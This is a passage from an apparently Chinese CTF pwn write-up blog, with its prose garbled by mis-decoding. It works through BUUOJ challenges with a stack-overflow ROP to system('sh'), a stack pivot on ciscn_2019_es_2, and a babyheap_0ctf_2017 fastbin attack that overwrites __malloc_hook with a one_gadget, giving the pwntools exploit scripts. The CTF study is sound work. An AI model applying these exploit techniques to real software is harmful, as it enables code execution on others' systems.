<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">AddLog</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input new log info:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __isoc99_scanf(<span class="string">&quot;%128s&quot;</span>, src);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> __cdecl <span class="title function_">GetFlag</span><span class="params">(<span class="type">char</span> *src)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest[<span class="number">4</span>]; <span class="comment">// [esp+0h] [ebp-48h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">60</span>]; <span class="comment">// [esp+4h] [ebp-44h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *dest = <span class="number">48</span>;</span><br><span class="line">  <span class="built_in">memset</span>(v3, <span class="number">0</span>, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  <span class="built_in">strcpy</span>(dest, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;The flag is your log:%s\n&quot;</span>, dest);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>dest</code>å­—ç¬¦ä¸²åœ¨æ ˆä¸Š æ‰€ä»¥<code>src</code>è¶…è¿‡<code>dest</code>é•¿åº¦çš„éƒ¨åˆ†ä¼šè¢«å¤åˆ¶åœ¨æ ˆä¸Šå¯¼è‡´æ ˆæº¢å‡º è¿™é‡Œæ„é€ ROPçš„æ€è·¯æ˜¯ç›´æ¥åˆ©ç”¨ç¨‹åºä¸­ç”¨åˆ°çš„<code>system()</code>é…åˆå­—ç¬¦ä¸²<code>fflush</code>åä¸¤ä¸ªå­—ç¬¦<code>sh</code>æ¥get shell ä½†æ˜¯å®æ“çš„æ—¶å€™å‘ç°å¦‚æœè¦åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´çš„è¯ä¼šè¦†ç›–ä¸€ä¸ªåªåœ¨ä¸»å‡½æ•°å¼€å¤´åˆå§‹åŒ–çš„è¡¨å¤´æŒ‡é’ˆ(ebx)</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-103602.png" alt="image-20240708103555476"></p>
<p>å¦‚æœè¢«æ— æ³•è§£å¼•ç”¨çš„4bytesæ•°æ®è¦†ç›–çš„è¯ç¨‹åºä¼šç›´æ¥åœ¨<code>puts()</code>å°±æŠ¥é”™ç„¶ååœæ­¢ è€Œè¡¨å¤´çš„åœ°å€æ˜¯<code>0x804A000</code> ç”¨æ¥æ„é€ payloadçš„<code>scanf</code>å‡½æ•°ä¼šåœ¨ç©ºæ ¼(\x20), æ¢è¡Œ(\x0A), å­—ç¬¦ä¸²ç»“æŸç¬¦(\x00)å¤„åœæ­¢è¾“å…¥ æ— æ³•åšåˆ°ä¸æ›´æ”¹ä¿å­˜ebxæ ˆç©ºé—´çš„æ ˆæº¢å‡º æ‰€ä»¥è¿™é‡Œè¿”å›åœ°å€ä¸èƒ½é€‰ä¸ºè°ƒç”¨<code>getflag()</code>çš„ä¸‹ä¸€è¡Œçš„åœ°å€ è€Œæ˜¯<code>exit()</code></p>
<p>æ„é€ å¦‚ä¸‹payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">system_got = p32(elf.got[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">system_plt = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">exit_plt = p32(elf.plt[<span class="string">&#x27;exit&#x27;</span>])</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x4C</span></span><br><span class="line">binsh = p32(<span class="number">0x80482EA</span>)</span><br><span class="line"></span><br><span class="line">payload = padding + system_plt+ exit_plt + binsh + p32(<span class="number">0</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;administrator\x00&#x27;</span>)</span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;info:&#x27;</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sh.recvline()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="ä¸€äº›è¿·æ€"><a href="#ä¸€äº›è¿·æ€" class="headerlink" title="ä¸€äº›è¿·æ€"></a>ä¸€äº›è¿·æ€</h3><p>ä¸€å¼€å§‹å°è¯•è¿‡ä½¿ç”¨ret2libcçš„æ–¹æ³•åœ¨libcä¸­å¯»æ‰¾<code>/bin/sh</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">sh.sendline(<span class="string">b&#x27;administrator\x00&#x27;</span>)</span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">padding = <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x4C</span></span><br><span class="line">payload1 = padding + puts_plt + ret_main + system_got + exit_plt + main_arg + p32(<span class="number">0</span>)</span><br><span class="line">sh.recvuntil(<span class="string">&#x27;info:&#x27;</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line"></span><br><span class="line">recvpromt(sh)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(sh.recvline())</span><br><span class="line">line = sh.recvline()</span><br><span class="line"><span class="built_in">print</span>(line)</span><br><span class="line">system_addr = u32(line[-<span class="number">5</span>:-<span class="number">1</span>])</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;system&#x27;</span>, system_addr)</span><br><span class="line">libc_base = system_addr - libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh = libc_base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>ç»“æœputsè¾“å‡ºçš„å†…å®¹æ˜¯<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113408.png" alt="image-20240708113408269"></p>
<img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/07/08/20240708-113611.png" style="zoom:50%;" />

<p>æ˜¾ç„¶ä¸æ­¢è¾“å‡ºäº†systemçš„åœ°å€ ç›®å‰è¿˜æ²¡ææ‡‚ä¸ºä»€ä¹ˆ å¸Œæœ›ä»¥åèƒ½ææ˜ç™½</p>
<h4 id="23-7-16"><a href="#23-7-16" class="headerlink" title="23&#x2F;7&#x2F;16"></a>23&#x2F;7&#x2F;16</h4><p>è²Œä¼¼æ˜¯å› ä¸ºgotè¡¨ä¸ä¸€å®šç›´æ¥è·³è½¬åˆ°å†…å­˜ä¸­çš„åº“å‡½æ•° å‰é¢è¿˜æœ‰ä¸€äº›æŒ‡ä»¤</p>
<h2 id="BUUOJ-ciscn-2019-es-2-æ ˆè¿ç§»"><a href="#BUUOJ-ciscn-2019-es-2-æ ˆè¿ç§»" class="headerlink" title="BUUOJ-ciscn_2019_es_2 | æ ˆè¿ç§»"></a>BUUOJ-ciscn_2019_es_2 | æ ˆè¿ç§»</h2><p>åªå¼€äº†NX åŸºæœ¬ä¸Šä¸ç”¨è€ƒè™‘æ‰§è¡Œshellcodeäº† ç›´æ¥çœ‹æ¼æ´å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æº¢å‡ºçš„éƒ¨åˆ†æœ€å¤šåªåˆ°Callerâ€™s EBPå’ŒRetaddr å°±ç®—åŸç¨‹åºåŠ è½½äº†<code>system()</code>ä¹Ÿä¸å¤Ÿä¼ å…¥å‚æ•° ä¸ºäº†æ‰©å±•å¯ç”¨çš„æ ˆç©ºé—´å°±è¦ç”¨åˆ°<strong>æ ˆè¿ç§»</strong>æŠ€æœ¯ </p>
<h3 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h3><p>å‡½æ•°è¿”å›æ—¶æ‰§è¡Œçš„leaveå’ŒretæŒ‡ä»¤å®é™…ä¸Šæ˜¯å‡ ä¸ªæŒ‡ä»¤çš„é›†åˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave _ mov esp,ebp</span><br><span class="line">     |_ pop ebp</span><br><span class="line">ret   _ pop eip</span><br></pre></td></tr></table></figure>

<p>ebpæ˜¯ç”¨äºå­˜æ”¾è°ƒç”¨è€…ebpçš„åœ°å€çš„é”šç‚¹ è€Œä»leaveæŒ‡ä»¤å®é™…çš„ä¸¤æ¡æŒ‡ä»¤å¯ä»¥çœ‹å‡º ebpå’Œespæ˜¯å®Œå…¨å¯ä»¥äº’ç›¸å½±å“çš„ ä»è€Œeipä¹Ÿèƒ½è¢«ebpæ§åˆ¶ä»¥è¾¾åˆ°æŒæ¡æ§åˆ¶æµçš„ç›®çš„:<code>EBP &lt;--&gt; ESP --&gt; EIP</code></p>
<p>ä»¥è¿™ä¸€é¢˜ä¸ºä¾‹å­ ç”¨ç¼“å†²åŒºé¦–åœ°å€<code>buf_addr - 4</code>è¦†ç›–Callerâ€™s EBP å†ç”¨leaveæŒ‡ä»¤çš„åœ°å€è¦†ç›–è¿”å›åœ°å€ è¿™æ ·å†æ¬¡æ‰§è¡Œleaveæ—¶espå°±ä¼šè¢«æ–°é”šç‚¹éª—åˆ°ç¼“å†²åŒºä¸Š å†æ‰§è¡Œretæ—¶å°±ä¼šå°†ç¼“å†²åŒºä¸Šçš„ç›®æ ‡åœ°å€é€å…¥eip ç›¸å½“äºå¹³æ—¶çš„æ ˆæº¢å‡ºçš„éƒ¨åˆ†æ‰©å±•åˆ°ç¼“å†²åŒºçš„éƒ¨åˆ† å®ç°æ ˆè¿ç§»</p>
<p>è€Œè¦å®ç°æ ˆè¿ç§»åˆ°æ–°çš„æ ˆåœ°å€ä¸Šæœ€å°‘éœ€è¦ä¸€æ¬¡æ³„éœ²æ ˆåœ°å€ è¿™é¢˜åˆšå¥½æä¾›äº†<code>printf()</code>å’Œä¸¤æ¬¡è¾“å…¥</p>
<p>è®¡ç®—å‡ºCallerâ€™s ebpçš„åœ°å€è·ç¦»<code>buf_addr - 4</code>çš„å­—èŠ‚æ•°åå°±èƒ½æ„é€ å¦‚ä¸‹çš„payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_es_2&#x27;</span>)</span><br><span class="line">system = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">bin_sh = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">leav_ret = p32(<span class="number">0x80485FC</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x28</span>)</span><br><span class="line">msg = sh.recvuntil(<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line">ebp = u32(msg[-<span class="number">4</span>:]) - <span class="number">0x3C</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">binsh_addr = ebp + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = system + <span class="string">b&#x27;AAAA&#x27;</span> + p32(binsh_addr) + bin_sh</span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x28</span> - <span class="built_in">len</span>(payload)) + p32(ebp) + leav_ret</span><br><span class="line"></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="BUUOJ-babyheap-0ctf-2017-å †æº¢å‡º-Use-after-free"><a href="#BUUOJ-babyheap-0ctf-2017-å †æº¢å‡º-Use-after-free" class="headerlink" title="BUUOJ-babyheap_0ctf_2017 | å †æº¢å‡º | Use after free"></a>BUUOJ-babyheap_0ctf_2017 | å †æº¢å‡º | Use after free</h2><p>å‰ç½®çŸ¥è¯† : <a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/basicheap.html">https://wiki.wgpsec.org/knowledge/ctf/basicheap.html</a></p>
<p>ç›´æ¥çœ‹ä¸»å‡½æ•°:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 *chunks; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  chunks = (__int64 *)sub_56219BC00B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">switch</span> ( get_num() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        alloc(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        fill(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        free_0(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        dump(chunks);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ ¹æ®è¾“å…¥è¿›è¡Œæ“ä½œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> - ç”³è¯·ä¸€ä¸ªå † è®°å½•åœ¨ç¨‹åºè‡ªå·±çš„ç»“æ„ä½“chunksä¸­ chunksä¸­è®°å½•chunksæ˜¯å¦åœ¨ä½¿ç”¨, Size, Chunk</span><br><span class="line"><span class="number">2</span> - é€‰æ‹©ä¸€ä¸ªchunkç¼–è¾‘å…¶dataåŒºåŸŸ</span><br><span class="line">    æ­¤å¤„å­˜åœ¨å †æº¢å‡º ç¼–è¾‘ä¸€ä¸ªchunkçš„æ•°æ®æ—¶æ²¡æœ‰æ£€æµ‹å¤§å° å¯ä»¥ä¿®æ”¹ä¸‹ä¸€ä¸ªchunkçš„æ•°æ®</span><br><span class="line"><span class="number">3</span> - é‡Šæ”¾ä¸€ä¸ªchunk</span><br><span class="line"><span class="number">3</span> - æ ¹æ®chunksä¸­çš„Sizeæ˜¾ç¤ºä¸€ä¸ªchunkçš„æ•°æ®</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯ä»¥ä½¿ç”¨ç¬¬nä¸ªchunkç¼–è¾‘ç¬¬n+1ä¸ªchunkçš„headeræ¥è®©å…¶sizeè¶³å¤Ÿè¦†ç›–ç¬¬n+2ä¸ªchunk å½“ç¬¬n+2ä¸ªchunkè¢«é‡Šæ”¾è¿›<code>unsorted bin</code>æ—¶é€šè¿‡n+1æ¥æ˜¾ç¤ºn+2ä¸­å‚¨å­˜çš„<code>fd</code>å’Œ<code>bk</code>çš„å€¼ å› ä¸º<code>unsorted bin</code>ä¸­åªæœ‰å®ƒä¸€ä¸ªchunk, <code>fd</code>å’Œ<code>bk</code>éƒ½æŒ‡å‘<code>main_arena + offset</code> æ®æ­¤å¯ä»¥æ³„éœ²libcçš„åŸºå€ ç„¶åå†é€šè¿‡æ„é€ fake chunkæ¥è¿›è¡Œä»»æ„åœ°å€å†™ è¦†ç›–<code>__malloc_hook</code>æŒ‡é’ˆ ä½¿å…¶å˜ä¸ºæˆ‘ä»¬æ‰¾åˆ°çš„one gadget æ­¤æ—¶å†ç”³è¯·å †æ—¶å°±ä¼šè§¦å‘åŸæœ¬åº”è¯¥è§¦å‘<code>__malloc_hook</code>çš„one gadget</p>
<h3 id="å…·ä½“æ€è·¯"><a href="#å…·ä½“æ€è·¯" class="headerlink" title="å…·ä½“æ€è·¯"></a>å…·ä½“æ€è·¯</h3><p>å…ˆä½¿ç”¨<a target="_blank" rel="noopener" href="https://github.com/bash-c/main_arena_offset/blob/master/main_arena">å·¥å…·</a>æ‰¾åˆ°åé¢è¦ç”¨çš„main_arenaåœ¨libcä¸­çš„åœ°å€:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-202523.png" alt="image-20241015202428887"></p>
<p>å†ç”¨<a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">å¦ä¸€ä¸ªå·¥å…·</a>æ‰¾åˆ°libcä¸­å­˜åœ¨çš„one gadget:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024%2F10%2F15%2F20241015-203101.png" alt="image-20241015203101596"></p>
<h4 id="è¦†ç›–chunk1çš„header"><a href="#è¦†ç›–chunk1çš„header" class="headerlink" title="è¦†ç›–chunk1çš„header"></a>è¦†ç›–chunk1çš„header</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 1</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># 2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 3</span></span><br><span class="line">fill(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0xB1</span>))</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹æ‰chunk1çš„headerä¸­çš„<code>size</code>å­—æ®µå¹¶é‡Šæ”¾chunk1å ä¸‹æ¬¡å†åˆ†é…0xA0(+ 0x10(headeré•¿åº¦) | 1(<code>P</code>æ ‡å¿—ä½) &#x3D;&#x3D; 0xB1)å¤§å°çš„chunkæ—¶ä¼šå› ä¸ºæ£€æµ‹åˆ°<code>fast bin</code>ä¸­æœ‰å¯¹åº”å¤§å°çš„chunkè€Œç›´æ¥åˆ†é…åˆ°åŸæ¥chunk1çš„ä½ç½®</p>
<p>è¿™é‡Œåˆ›å»ºchunk3çš„ç›®çš„æ˜¯é˜²æ­¢chunk2åœ¨åç»­é‡Šæ”¾æ—¶ç›´æ¥è¢«åˆ’å…¥<code>top chunk</code></p>
<h4 id="ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc-base"><a href="#ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc-base" class="headerlink" title="ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc base"></a>ä½¿ç”¨è¦†ç›–chunk2çš„chunk1æ³„éœ²libc base</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0xA0</span>) <span class="comment"># 1</span></span><br><span class="line">fill(<span class="number">1</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">3</span> * <span class="number">8</span> + p64(<span class="number">0x91</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">data = dump(<span class="number">1</span>)</span><br><span class="line">base = <span class="built_in">int</span>.from_bytes(data[:data.index(<span class="string">b&#x27;\x7f&#x27;</span>) + <span class="number">1</span>][-<span class="number">6</span>:], <span class="string">&#x27;little&#x27;</span>) - (main_arena + <span class="number">0x58</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;libc_base = <span class="subst">&#123;<span class="built_in">hex</span>(base)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹chunk1è¿›è¡Œç¼–è¾‘å¹¶ä¸”è¦†ç›–chunk2çš„åŸå› æ˜¯ç¨‹åº<code>calloc()</code>åˆ†é…chunkä¼šåˆå§‹åŒ–dataä¸º{0}éœ€è¦ä¿®å¤chunk2çš„chunk header</p>
<h4 id="è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake-chunk"><a href="#è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake-chunk" class="headerlink" title="è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake chunk"></a>è¦†ç›–chunk2çš„fdå­—æ®µä¼ªé€ fake chunk</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">one_gadget = base + one[<span class="number">1</span>]</span><br><span class="line">malloc_hook = base + so.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">fkfd = malloc_hook - <span class="number">0x23</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">fill(<span class="number">1</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">3</span> * <span class="number">8</span> + p64(<span class="number">0x71</span>) + p64(fkfd))</span><br></pre></td></tr></table></figure>

<p>è¦†ç›–å‰:</p>
<p><code>(0x60 bytes)Fast bin -&gt; chunk2</code></p>
<p>è¦†ç›–å:</p>
<p><code>(0x60 bytes)Fast bin -&gt; chunk2 -&gt; fake chunk</code></p>
<p>å†ç”³è¯·ä¸¤ä¸ªsizeå‡ä¸º0x60çš„chunkå°±èƒ½è·å–åˆ°å¯¹fake chunk ä¹Ÿå°±æ˜¯<code>__malloc_hook</code>æ‰€åœ¨å†…å­˜åŒºåŸŸè¿›è¡Œå†™çš„èƒ½åŠ›äº†</p>
<p>è¿™é‡Œfake fdé€‰æ‹©åœ¨ - 0x23åç§»çš„åŸå› æ˜¯fastbinåœ¨åˆ†é…chunkçš„æ—¶å€™ä¼šæ£€æµ‹chunkçš„<code>P</code>æ ‡å¿—ä½ è€Œ - 0x23ä½ç½®å¯¹åº”çš„chunk <code>P</code>æ ‡å¿—ä½æ‰€åœ¨å­—èŠ‚æ˜¯bâ€™\x7fâ€™ æœ€ä½ä½æ˜¯1 ç¬¦åˆäº†fastbinåˆ†é…chunkçš„æ¡ä»¶</p>
<h4 id="è¦†ç›–-malloc-hook"><a href="#è¦†ç›–-malloc-hook" class="headerlink" title="è¦†ç›–__malloc_hook"></a>è¦†ç›–__malloc_hook</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 2</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># 4</span></span><br><span class="line">fill(<span class="number">4</span>, <span class="string">b&#x27;C&#x27;</span> * <span class="number">0x13</span> + p64(one_gadget))</span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment"># 5</span></span><br></pre></td></tr></table></figure>

<p>ç”³è¯·chunk5æ—¶ç¨‹åºå°±ä¼šè°ƒç”¨åŸæœ¬åº”è¯¥æ˜¯<code>__malloc_hook</code>çš„one gadgetè¾¾æˆget shell</p>
<h2 id="BUUOJ-inndy-rop-é™æ€ç¼–è¯‘pwn"><a href="#BUUOJ-inndy-rop-é™æ€ç¼–è¯‘pwn" class="headerlink" title="BUUOJ-inndy_rop | é™æ€ç¼–è¯‘pwn"></a>BUUOJ-inndy_rop | é™æ€ç¼–è¯‘pwn</h2><p>å¦‚æœæ‹¿åˆ°çš„äºŒè¿›åˆ¶æ–‡ä»¶æ˜¯é™æ€ç¼–è¯‘å‡ºæ¥çš„ åŸºæœ¬ä¸Šä¸å¯èƒ½åº”ç”¨ret2libc å› ä¸ºlibcå°±åœ¨ç¨‹åºçš„.textæ®µä¸­ ä¸€äº›èƒ½å¤Ÿget shellçš„å‡½æ•°è‚¯å®šä¹Ÿä¼šè¢«ä¿®æ”¹ä»è€Œä¸èƒ½ä½¿ç”¨ è¿™æ—¶å€™å°±éœ€è¦åˆ©ç”¨å…¶ä»–çš„é£é™©å‡½æ•°å°è¯•ret2sehllcode é€šå¸¸è¿™ä¸ªé£é™©å‡½æ•°æ˜¯<code>mmap()</code>æˆ–è€…<code>mprotec()</code></p>
<p>ä»¥ä¸‹æ˜¯è¿™ä¸¤ä¸ªå‡½æ•°åˆ†åˆ«ç”¨æ¥ç”³è¯·å¯æ‰§è¡Œå†…å­˜çš„æ–¹æ³•</p>
